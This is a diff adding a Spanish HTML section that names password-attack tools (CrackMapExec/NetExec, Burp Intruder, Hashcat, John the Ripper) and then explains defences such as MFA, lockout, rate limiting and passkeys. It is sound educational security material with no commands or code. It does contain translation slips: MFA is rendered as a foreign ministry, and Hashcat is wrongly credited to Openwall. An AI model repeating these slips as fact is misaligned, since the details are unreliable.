+<p> :radio_button: <b> CrackMapExec (CME)/NetExec </b> es una herramienta de pentesting que permite realizar ataques de credenciales contra múltiples protocolos (SMB, LDAP, Kerberos, etc.) y sistemas Windows. </p>
+<p> :radio_button: <b> Burp Suite intruder </b> es una herramienta de pentesting que permite realizar ataques de fuerza bruta, diccionario y híbridos contra aplicaciones web.. </p>
+<p> :radio_button: <b> Hashcat</b> Es una herramienta de cracking de hashes desarrollada por Openwall, usada para crackear hashes de contraseñas en múltiples formatos (MD5, SHA1, NTLM, etc.).. </p>
+<p> :radio_button: <b> John the Ripper  </b> es una herramienta de cracking de hashes desarrollada por Openwall, usada para crackear hashes de contraseñas en múltiples formatos (MD5, SHA1, NTLM, etc.). </p>
+
+
+
+<p>Mitigación de ataques con contraseña
+La mitigación contra ataques de contraseñas depende del sistema de destino. Las defensas modernas incluyen:
+
+Las políticas de contraseñas imponen restricciones de complejidad mínima. Orientación moderna como NIST SP 800-63B (un EE. UU. El estándar gubernamental para las pautas de identidad digital) recomienda centrarse en la longitud de la contraseña en lugar de las reglas de complejidad, bloquear las contraseñas comprometidas conocidas y no requerir cambios regulares de contraseña a menos que haya evidencia de compromiso.
+
+El bloqueo de cuenta bloquea temporal o permanentemente una cuenta después de una cierta cantidad de intentos fallidos. Esto es eficaz contra la fuerza bruta, pero puede evitarse mediante la pulverización de contraseñas o abusarse de él para denegar el servicio.
+
+La limitación de velocidad y el bloqueo retrasan las respuestas a los intentos de inicio de sesión. Unos pocos segundos de retraso son tolerables para los usuarios legítimos, pero obstaculizan gravemente las herramientas automatizadas. Las implementaciones más sofisticadas utilizan un retroceso exponencial.
+
+CAPTCHA requiere resolver un desafío difícil para las máquinas. Los CAPTCHA modernos utilizan análisis de comportamiento y puntuación de riesgos en lugar de simplemente reconocimiento de imágenes.
+
+Autenticación multifactor (Ministerio de Relaciones Exteriores) requiere verificación adicional más allá de la contraseña, como un código de una aplicación de autenticación, SMS (aunque los SMS son menos seguros) o una clave de seguridad de hardware. MFA es una de las defensas más efectivas contra los ataques de contraseñas.
+
+La autenticación sin contraseña elimina las contraseñas por completo utilizando métodos como:
+
+Las claves de acceso (FIDO2/WebAuthn) utilizan claves criptográficas almacenadas en dispositivos, reemplazando las contraseñas con verificación biométrica o PIN.
+Enlaces mágicos enviados por correo electrónico.
+Claves de seguridad de hardware como YubiKeys.
+La detección de contraseñas violadas verifica las contraseñas con bases de datos de violaciones conocidas durante el registro y el inicio de sesión. Servicios como "Have I Been Pwned" proporcionan API para este propósito.
+
+El análisis del comportamiento detecta anomalías como intentos de inicio de sesión desde ubicaciones inusuales, escenarios de viaje imposibles o patrones consistentes con ataques automatizados.
+
+Controles basados en IP que incluyen geofencing y bloqueo de dispositivos maliciosos conocidos IP, y requerir verificación adicional para nuevos dispositivos o ubicaciones.
+
+El uso de una combinación de los enfoques anteriores proporciona una defensa profunda contra ataques de contraseñas. Para entornos de alta seguridad, avanzar hacia la autenticación sin contraseña elimina por completo muchos de estos vectores de ataque.</p>
+
+
+</br>
+
+
+
 
 
 
